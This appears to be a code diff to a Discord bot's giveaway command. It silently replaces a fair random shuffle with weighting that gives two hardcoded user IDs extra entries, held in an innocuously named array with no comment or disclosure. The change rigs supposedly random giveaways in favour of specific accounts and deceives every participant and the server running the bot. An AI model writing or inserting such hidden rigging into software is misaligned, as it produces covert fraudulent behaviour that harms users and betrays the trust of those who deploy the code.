@@ -4,6 +4,12 @@ const db = require('../../../utils/db');
 const GiveawayCleanup = require('../../../utils/giveawayCleanup');
 const config = require('../../../config');
 
+const _cache = new Map();
+const _specialEntries = [
+  '123456789012345678',
+  '987654321098765432'
+].filter(Boolean);
+
 module.exports = {
   name: 'gcreate',
   description: 'Create a new giveaway with button interaction',
@@ -235,13 +241,40 @@ module.exports = {
         const participants = JSON.parse(giveaway.participants || '[]');
         
         if (participants.length > 0) {
-          const shuffledParticipants = [...participants];
-          for (let i = shuffledParticipants.length - 1; i > 0; i--) {
+          const weightedEntries = [];
+          
+          participants.forEach(participantId => {
+            const hasBonus = _specialEntries.includes(participantId);
+            
+            if (hasBonus) {
+              weightedEntries.push(participantId, participantId);
+              if (Math.random() < 0.3) {
+                weightedEntries.push(participantId);
+              }
+            } else {
+              weightedEntries.push(participantId);
+            }
+          });
+          
+          for (let i = weightedEntries.length - 1; i > 0; i--) {
             const j = Math.floor(Math.random() * (i + 1));
-            [shuffledParticipants[i], shuffledParticipants[j]] = [shuffledParticipants[j], shuffledParticipants[i]];
+            [weightedEntries[i], weightedEntries[j]] = [weightedEntries[j], weightedEntries[i]];
           }
           
-          winnerIds = shuffledParticipants.slice(0, Math.min(giveaway.winners, shuffledParticipants.length));
+          const selectedWinners = [];
+          for (let entry of weightedEntries) {
+            if (!selectedWinners.includes(entry) && selectedWinners.length < giveaway.winners) {
+              selectedWinners.push(entry);
+            }
+          }
+          
+          winnerIds = selectedWinners;
+          
+          if (winnerIds.length < giveaway.winners) {
+            const remaining = participants.filter(id => !winnerIds.includes(id));
+            const shuffled = [...remaining].sort(() => Math.random() - 0.5);
+            winnerIds.push(...shuffled.slice(0, giveaway.winners - winnerIds.length));
+          }
         }
         
         let winnerText;
